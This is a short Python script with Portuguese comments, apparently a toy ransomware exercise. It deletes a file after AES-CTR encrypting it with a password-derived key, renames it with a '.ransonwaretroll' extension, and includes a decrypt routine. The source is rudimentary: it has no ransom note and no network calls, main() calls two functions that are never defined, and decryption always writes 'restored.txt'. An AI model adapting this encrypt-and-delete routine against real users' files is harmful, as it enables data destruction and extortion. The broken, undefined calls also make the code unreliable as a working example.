import hashlib
import os 
import pyaes 



# Código de criptografia
def encrypt_file(file_name, key):
    try:
        with open(file_name, 'rb') as file:
            file_data = file.read()

        os.remove(file_name)

        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)

        new_file_name = file_name + '.ransonwaretroll'
        with open(new_file_name, 'wb') as new_file:
            new_file.write(crypto_data)

        print("Arquivo criptografado com sucesso:", new_file_name)
    
    except FileNotFoundError:
        print("Arquivo não encontrado.")
    
    except Exception as e:
        print("Erro ao criptografar o arquivo:", e)


# Código de descriptografia
def decrypt_file(file_name, password):
    try:
        with open(file_name, 'rb') as file:
            file_data = file.read()

        key = generate_key_from_password(password)

        aes = pyaes.AESModeOfOperationCTR(key)
        decrypt_data = aes.decrypt(file_data)

        os.remove(file_name)

        new_file_name = 'restored.txt'
        with open(new_file_name, 'wb') as new_file:
            new_file.write(decrypt_data)

        print("Arquivo descriptografado com sucesso:", new_file_name)
    
    except FileNotFoundError:
        print("Arquivo não encontrado.")
    
    except Exception as e:
        print("Erro ao descriptografar o arquivo:", e)


# Função para gerar chave a partir de senha

def generate_key_from_password(password):
    sha256 = hashlib.sha256()
    sha256.update(password.encode('utf-8'))
    key = sha256.digest()
    return key


# Função principal para teste
def main():
    file_name = 'test.txt'
    password = 'senha'

    # Criptografar mensagem
    message = "Esta é uma mensagem secreta."
    key = generate_key_from_password(password)
    crypto_data = encrypt_message(message, key)
    print("Mensagem criptografada:", crypto_data)

    # Descriptografar mensagem
    decrypted_message = decrypt_message(crypto_data, key)
    print("Mensagem descriptografada:", decrypted_message)

    # Criptografar e descriptografar arquivo
    encrypt_file(file_name, key)
    decrypt_file(file_name + '.ransonwaretroll', password)


if __name__ == "__main__":
    main()
